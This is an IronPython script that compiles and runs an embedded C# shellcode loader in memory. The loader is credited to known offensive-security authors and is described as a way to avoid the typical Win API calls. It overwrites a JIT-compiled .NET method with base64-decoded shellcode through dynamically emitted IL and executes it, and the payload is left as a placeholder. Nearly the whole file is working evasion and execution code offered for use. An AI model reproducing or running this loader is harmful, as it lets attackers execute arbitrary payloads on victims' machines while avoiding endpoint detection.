import clr
from System import Array
from System.CodeDom import Compiler
from System.IO import Path, Directory
from Microsoft.CSharp import CSharpCodeProvider

unmanaged_code = """
using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection.Emit;
using System.Reflection;
using System.Security;
using System.Runtime.InteropServices;
using System.IO;

/*
 * Author: Chris Ross (@xorrior), ported from @mattefistation's Invoke-ShellcodeMSIL script.
 * Pass your base64 encoded shellcode to the Main() function.
 * I find this method of loading shellcode interesting because it does not require any of the typical Win API
 * calls found in other shellcode loaders.
 *
 * Slightly modified by @byt3bl33d3r
 */

namespace NoAPISCLoader
{
    public class Program
    {
        private static IntPtr GetMethodAddress(MethodInfo mInfo)
        {
            var methodAttribs = mInfo.GetMethodImplementationFlags();
            Type returnType = null;
            Type MethodLeakerType = null;
            Int32 MethodAddressx86;
            Int64 MethodAddressx64;
            IntPtr mAddress = IntPtr.Zero;


            object[] methParams = new object[] { };
            MethodLeakerType = Assembly.GetExecutingAssembly().GetType("MethodLeaker");
            if (MethodLeakerType == null)
            {
                if (IntPtr.Size == 4)
                {
                    returnType = typeof(Int32);
                }
                else
                {
                    returnType = typeof(Int64);
                }

                var domain = AppDomain.CurrentDomain;
                var DynAssembly = new AssemblyName("MethodLeakAssembly");
                var AssemblyBuilder = domain.DefineDynamicAssembly(DynAssembly, AssemblyBuilderAccess.Run);
                var ModBuilder = AssemblyBuilder.DefineDynamicModule("MethodLeakModule");
                var TypeBuilder = ModBuilder.DefineType("MethodLeaker", TypeAttributes.Public);
                var MethodBuilder = TypeBuilder.DefineMethod("LeakMethod", (MethodAttributes.Public | MethodAttributes.Static), returnType, null);
                var Generator = MethodBuilder.GetILGenerator();
                Generator.Emit(OpCodes.Ldftn, mInfo);
                Generator.Emit(OpCodes.Ret);

                MethodLeakerType = TypeBuilder.CreateType();
            }

            try
            {
                var Method = MethodLeakerType.GetMethod("LeakMethod");
                object[] methargs = new object[] { };
                if (IntPtr.Size == 4)
                {
                    MethodAddressx86 = (Int32)Method.Invoke(null, methargs);
                    mAddress = new IntPtr(MethodAddressx86);
                }
                else
                {
                    MethodAddressx64 = (Int64)Method.Invoke(null, methargs);
                    mAddress = new IntPtr(MethodAddressx64);
                }

                return mAddress;
            }
            catch (Exception)
            {
                return IntPtr.Zero;
            }

        }
        public static void Main(string[] args)
        {
            Type SmasherType = null;

            string encSC = args[0];

            SmasherType = Assembly.GetExecutingAssembly().GetType("MethodSmasher");
            if (SmasherType == null)
            {
                AppDomain currDomain = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("MethodSmasher");
                AssemblyBuilder assBuilder = currDomain.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                AllowPartiallyTrustedCallersAttribute att = new AllowPartiallyTrustedCallersAttribute();
                ConstructorInfo attConstructor = att.GetType().GetConstructors()[0];
                CustomAttributeBuilder attBuilder = new CustomAttributeBuilder(attConstructor, new object[] { });
                assBuilder.SetCustomAttribute(attBuilder);

                ModuleBuilder modBuilder = assBuilder.DefineDynamicModule("MethodSmasher");
                UnverifiableCodeAttribute codAtt = new UnverifiableCodeAttribute();
                ConstructorInfo codAttConstructor = codAtt.GetType().GetConstructors()[0];
                CustomAttributeBuilder modAttBuilder = new CustomAttributeBuilder(codAttConstructor, new object[] { });
                modBuilder.SetCustomAttribute(modAttBuilder);

                TypeBuilder tBuilder = modBuilder.DefineType("MethodSmasher", TypeAttributes.Public);
                Type[] parameters = new Type[3] { typeof(IntPtr), typeof(IntPtr), typeof(Int32) };
                MethodBuilder methBuilder = tBuilder.DefineMethod("OverwriteMethod", (MethodAttributes.Static | MethodAttributes.Public), null, parameters);

                ILGenerator generator = methBuilder.GetILGenerator();

                generator.Emit(OpCodes.Ldarg_0);
                generator.Emit(OpCodes.Ldarg_1);
                generator.Emit(OpCodes.Ldarg_2);
                generator.Emit(OpCodes.Volatile);
                generator.Emit(OpCodes.Cpblk);
                generator.Emit(OpCodes.Ret);

                SmasherType = tBuilder.CreateType();
            }

            MethodInfo OverwriteMethod = SmasherType.GetMethod("OverwriteMethod");
            Type SmashMeType = null;

            SmashMeType = Assembly.GetExecutingAssembly().GetType("SmashMe");
            if (SmashMeType == null)
            {
                AppDomain currDomain = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("SmashMe");
                AssemblyBuilder assBuilder = currDomain.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                AllowPartiallyTrustedCallersAttribute att = new AllowPartiallyTrustedCallersAttribute();
                ConstructorInfo attConstructor = att.GetType().GetConstructors()[0];
                CustomAttributeBuilder attBuilder = new CustomAttributeBuilder(attConstructor, new object[] { });
                assBuilder.SetCustomAttribute(attBuilder);

                ModuleBuilder modBuilder = assBuilder.DefineDynamicModule("SmashMe");
                UnverifiableCodeAttribute codAtt = new UnverifiableCodeAttribute();
                ConstructorInfo codAttConstructor = codAtt.GetType().GetConstructors()[0];
                CustomAttributeBuilder modAttBuilder = new CustomAttributeBuilder(codAttConstructor, new object[] { });
                modBuilder.SetCustomAttribute(modAttBuilder);

                TypeBuilder tBuilder = modBuilder.DefineType("SmashMe", TypeAttributes.Public);
                Type[] parameters = new Type[1] { typeof(Int32) };
                MethodBuilder mBuilder = tBuilder.DefineMethod("OverwriteMe", (MethodAttributes.Public | MethodAttributes.Static), typeof(Int32), parameters);
                ILGenerator generator = mBuilder.GetILGenerator();
                Int32 xorValue = 0x41424344;
                generator.DeclareLocal(typeof(Int32));
                generator.Emit(OpCodes.Ldarg_0);

                for (int i = 0; i < 100; i++)
                {
                    generator.Emit(OpCodes.Ldc_I4, xorValue);
                    generator.Emit(OpCodes.Xor);
                    generator.Emit(OpCodes.Stloc_0);
                    generator.Emit(OpCodes.Ldloc_0);
                    xorValue++;
                }
                generator.Emit(OpCodes.Ldc_I4, xorValue);
                generator.Emit(OpCodes.Xor);
                generator.Emit(OpCodes.Ret);

                SmashMeType = tBuilder.CreateType();
            }

            MethodInfo TargetMethod = SmashMeType.GetMethod("OverwriteMe");

            //Force target method to be JIT'd


            for (int i = 0; i < 20; i++)
            {
                TargetMethod.Invoke(null, new object[] { 0x11112222 });
            }

            IntPtr scAddress = IntPtr.Zero;

            if (IntPtr.Size == 4)
            {
                //Your shellcode should be base64 encoded
                byte[] buf = Convert.FromBase64String(encSC);

                byte[] shellcodeStub = new byte[10] { 0x60, 0xE8, 0x04, 0x00, 0x00, 0x00, 0x61, 0x31, 0xC0, 0xC3 };
                byte[] finalShellcode = new byte[buf.Length + shellcodeStub.Length];
                Buffer.BlockCopy(shellcodeStub, 0, finalShellcode, 0, shellcodeStub.Length);
                Buffer.BlockCopy(buf, 0, finalShellcode, shellcodeStub.Length, buf.Length);
                scAddress = Marshal.AllocHGlobal(finalShellcode.Length);
                Marshal.Copy(finalShellcode, 0, scAddress, finalShellcode.Length);

                var TargetMethodAddress = GetMethodAddress(TargetMethod);
                object[] methargs = new object[3] { TargetMethodAddress, scAddress, finalShellcode.Length };
                OverwriteMethod.Invoke(null, methargs);
                object[] methargs2 = new object[1] { 0x11112222 };
                var retval = TargetMethod.Invoke(null, methargs2);

                if ((Int32)retval != 0)
                {
                    System.Environment.Exit(0);
                }
            }
            else
            {
                //Your shellcode should be base64 encoded
                byte[] buf = Convert.FromBase64String(encSC);


                byte[] shellcodeStub = new byte[27] { 0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,0x31,0xC0,0xC3 };
                byte[] finalShellcode = new byte[buf.Length + shellcodeStub.Length];
                Buffer.BlockCopy(shellcodeStub, 0, finalShellcode, 0, shellcodeStub.Length);
                Buffer.BlockCopy(buf, 0, finalShellcode, shellcodeStub.Length, buf.Length);
                scAddress = Marshal.AllocHGlobal(finalShellcode.Length);
                Marshal.Copy(finalShellcode, 0, scAddress, finalShellcode.Length);

                var TargetMethodAddress = GetMethodAddress(TargetMethod);
                object[] methargs = new object[3] { TargetMethodAddress, scAddress, finalShellcode.Length };
                OverwriteMethod.Invoke(null, methargs);
                object[] methargs2 = new object[1] { 0x11112222 };
                var retval = TargetMethod.Invoke(null, methargs2);

                if ((Int32)retval != 0)
                {
                    System.Environment.Exit(0);
                }
            }
        }
    }
}
"""


def Generate(code, name, references=None, outputDirectory=None, inMemory=False):
    CompilerParams = Compiler.CompilerParameters()

    if outputDirectory is None:
        outputDirectory = Directory.GetCurrentDirectory()
    if not inMemory:
        CompilerParams.OutputAssembly = Path.Combine(outputDirectory, name + ".dll")
        CompilerParams.GenerateInMemory = False
    else:
        CompilerParams.GenerateInMemory = True

    CompilerParams.TreatWarningsAsErrors = False
    CompilerParams.GenerateExecutable = False
    CompilerParams.CompilerOptions = "/optimize /unsafe"

    for reference in references or []:
        CompilerParams.ReferencedAssemblies.Add(reference)

    provider = CSharpCodeProvider()
    compile = provider.CompileAssemblyFromSource(CompilerParams, code)

    if compile.Errors.HasErrors:
        raise Exception("Compile error: %r" % list(compile.Errors.List))

    if inMemory:
        return compile.CompiledAssembly
    return compile.PathToAssembly


# Bytecode, no disk forl to LoadLibrary from
assembly = Generate(unmanaged_code, 'NoAPISCLoader', inMemory=True)
print "[*] Type : {}".format(type(assembly))
print "[*] CodeBase: {}".format(assembly.CodeBase)
print "[*] FullName: {}".format(assembly.FullName)
print "[*] Dynamic? {}".format(assembly.IsDynamic)
print "[*] Location: {}".format("(In Memory)" if not assembly.Location else assembly.Location)
clr.AddReference(assembly)

from NoAPISCLoader.Program import Main

shellcode = "B64_SHELLCODE"

Main(Array[str]([shellcode]))

print "[+] Injected"
